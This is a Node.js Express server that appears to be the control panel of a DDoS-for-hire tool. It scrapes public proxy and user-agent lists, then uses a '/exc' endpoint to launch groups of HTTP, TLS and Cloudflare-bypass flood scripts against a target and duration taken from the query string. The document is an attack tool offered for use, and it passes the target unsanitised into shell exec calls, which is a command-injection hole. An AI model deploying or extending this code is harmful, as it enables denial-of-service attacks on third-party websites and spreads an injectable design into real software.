const express = require('express');
const { exec } = require('child_process');
const fs = require('fs');
const app = express();
const port = process.env.PORT || process.env.SERVER_PORT || 5032;
const cors = require('cors');
const cookieParser = require('cookie-parser');
app.use(express.json());
app.use(express.static('./assets/index.html'));
app.use(cookieParser());
app.use(cors());
const proxyUrls = [
  "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
  "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt",
  "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/https.txt",
  "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt",
  "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/https.txt",
  "https://multiproxy.org/txt_all/proxy.txt",
  "https://rootjazz.com/proxies/proxies.txt",
  "https://api.openproxylist.xyz/http.txt",
  "https://api.openproxylist.xyz/https.txt",
  "https://raw.githubusercontent.com/mmpx12/proxy-list/master/http.txt",
  "https://raw.githubusercontent.com/mmpx12/proxy-list/master/https.txt",
  "https://spys.me/proxy.txt"
];
async function scrapeProxy() {
  try {
    let allData = "";

    for (const url of proxyUrls) {
      try {
        const response = await fetch(url);
        const data = await response.text();
        allData += data + "\n";
      } catch (err) {
        console.log(`❌ Gagal ambil dari ${url}: ${err.message}`);
      }
    }

    fs.writeFileSync("proxy.txt", allData, "utf-8");
    console.log("Semua proxy berhasil disimpan ke proxy.txt");
  } catch (error) {
    console.error(`Error: ${error.message}`);
  }
}

async function scrapeUserAgent() {
  try {
    const response = await fetch('https://gist.githubusercontent.com/pzb/b4b6f57144aea7827ae4/raw/cf847b76a142955b1410c8bcef3aabe221a63db1/user-agents.txt');
    const data = await response.text();
    fs.writeFileSync('ua.txt', data, 'utf-8');
  } catch (error) {
    console.error(`Error fetching data: ${error.message}`);
  }
}
async function fetchData() {
  const response = await fetch('https://httpbin.org/get');
  const data = await response.json();
  console.log(`Copy : http://${data.origin}:${port}`);
  return data;
}

app.get('/exc', (req, res) => {
  const { target, time, methods } = req.query;
  res.status(200).json({
    message: 'API request received. Executing script shortly, By Snith #Exercist',
    target,
    time,
    methods
  });  
  if (methods === 'kill') {
    exec(`node ./assets/methods/H2CA.js ${target} ${time} 100 10 proxy.txt`);
    exec(`node ./assets/methods/HDRH2.js ${target} ${time} 10 100 true`);
    exec(`node ./assets/methods/H2F3.js ${target} ${time} 100 10 proxy.txt`);
    exec(`node ./assets/methods/BLAST.js ${target} ${time} 100 10 proxy.txt`);
   } else if (methods === 'KOMIX') {
    exec(`node ./assets/methods/HTTP.js ${target} ${time}`);
    exec(`node ./assets/methods/HTTPS.js ${target} ${time} 100 10 proxy.txt`);
    exec(`node ./assets/methods/HTTPX.js ${target} ${time} 100 10 proxy.txt`);
    exec(`node ./assets/methods/BLAST.js ${target} ${time} 100 10 proxy.txt`);
    exec(`node ./assets/methods/MIXMAX.js ${target} ${time} 100 10 proxy.txt`);
    } else if (methods === 'R2') {
    exec(`node ./assets/methods/TLS.js ${target} ${time} 100 10 proxy.txt`);
    exec(`node ./assets/methods/R2.js ${target} ${time} 100 10 proxy.txt`);
    exec(`node ./assets/methods/RAND.js ${target} ${time}`);
    exec(`node ./assets/methods/BLAST.js ${target} ${time} 100 10 proxy.txt`);
    } else if (methods === 'PSHT') {
    exec(`node ./assets/methods/H2CA.js ${target} ${time} 100 10 proxy.txt`);
    exec(`node ./assets/methods/HDRH2.js ${target} ${time} 10 100 true`);
    exec(`node ./assets/methods/H2F3.js ${target} ${time} 100 10 proxy.txt`);
    exec(`node ./assets/methods/HTTP.js ${target} ${time}`);
    exec(`node ./assets/methods/RAND.js ${target} ${time}`);
    exec(`node ./assets/methods/TLS.js ${target} ${time} 100 10 proxy.txt`);
    exec(`node ./assets/methods/R2.js ${target} ${time} 100 10 proxy.txt`);
    exec(`node ./assets/methods/HTTPS.js ${target} ${time} 100 10 proxy.txt`);
    exec(`node ./assets/methods/HTTPX.js ${target} ${time} 100 10 proxy.txt`);
    exec(`node ./assets/methods/BLAST.js ${target} ${time} 100 10 proxy.txt`);
   } else if (methods === 'pidoras') {
    exec(`node ./assets/methods/H2CA.js ${target} ${time} 100 10 proxy.txt`);
    exec(`node ./assets/methods/pidoras.js ${target} ${time} 100 10 proxy.txt`);
    exec(`node ./assets/methods/floods.js ${target} ${time} 100 10 proxy.txt`);
    exec(`node ./assets/methods/browser.js ${target} ${time} 100 10 proxy.txt`);
    exec(`node ./assets/methods/HDRH2.js ${target} ${time} 10 100 true`);
    exec(`node ./assets/methods/H2F3.js ${target} ${time} 100 10 proxy.txt`);
    exec(`node ./assets/methods/HTTP.js ${target} ${time}`);
    exec(`node ./assets/methods/Cloudflare.js ${target} ${time} 100`);
    exec(`node ./assets/methods/RAND.js ${target} ${time}`);
    exec(`node ./assets/methods/TLS.js ${target} ${time} 100 10 proxy.txt`);
    exec(`node ./assets/methods/R2.js ${target} ${time} 100 10 proxy.txt`);
    exec(`node ./assets/methods/HTTPS.js ${target} ${time} 100 10 proxy.txt`);
    exec(`node ./assets/methods/HTTP-RAW.js ${target} ${time} 100 10 proxy.txt`);
    exec(`node ./assets/methods/HTTPX.js ${target} ${time} 100 10 proxy.txt`);
    exec(`node ./assets/methods/BLAST.js ${target} ${time} 100 10 proxy.txt`);
   } else if (methods === 'exercist') {
    exec(`node ./assets/methods/novaria.js ${target} ${time} 100 10 proxy.txt`);
    exec(`node ./assets/methods/pidoras.js ${target} ${time} 100 10 proxy.txt`);
    exec(`node ./assets/methods/floods.js ${target} ${time} 100 10 proxy.txt`);
    exec(`node ./assets/methods/browser.js ${target} ${time} 100 10 proxy.txt`);
    exec(`node ./assets/methods/CBROWSER.js ${target} ${time} 100 10 proxy.txt`);
    exec(`node ./assets/methods/H2CA.js ${target} ${time} 100 10 proxy.txt`);
    exec(`node ./assets/methods/H2F3.js ${target} ${time} 100 10 proxy.txt`);
    exec(`node ./assets/methods/H2GEC.js ${target} ${time} 100 10 3 proxy.txt`);
    exec(`node ./assets/methods/HTTP.js ${target} ${time}`);
    exec(`node ./assets/methods/FLUTRA.js ${target} ${time}`);
    exec(`node ./assets/methods/Cloudflare.js ${target} ${time} 100`);
    exec(`node ./assets/methods/CFbypass.js ${target} ${time}`);
    exec(`node ./assets/methods/bypassv1 ${target} proxy.txt ${time} 100 10`);
    exec(`node ./assets/methods/hyper.js ${target} ${time} 100`);
    exec(`node ./assets/methods/RAND.js ${target} ${time}`);
    exec(`node ./assets/methods/TLS.js ${target} ${time} 100 10 proxy.txt`);
    exec(`node ./assets/methods/TLS-LOST.js ${target} ${time} 100 10 proxy.txt`);
    exec(`node ./assets/methods/TLS-BYPASS.js ${target} ${time} 100 10 proxy.txt`);
    exec(`node ./assets/methods/tls.vip ${target} ${time} 100 10 proxy.txt`);
    exec(`node ./assets/methods/R2.js ${target} ${time} 100 10 proxy.txt`);
    exec(`node ./assets/methods/HTTPS.js ${target} ${time} 100 10 proxy.txt`);
    exec(`node ./assets/methods/HTTPX.js ${target} ${time} 100 10 proxy.txt`);
    exec(`node ./assets/methods/BLAST.js ${target} ${time} 100 10 proxy.txt`);
   } else {
    console.log('Metode tidak dikenali atau format salah.');
  }
});

app.listen(port, () => {
  scrapeProxy();
  scrapeUserAgent();
  fetchData();
});
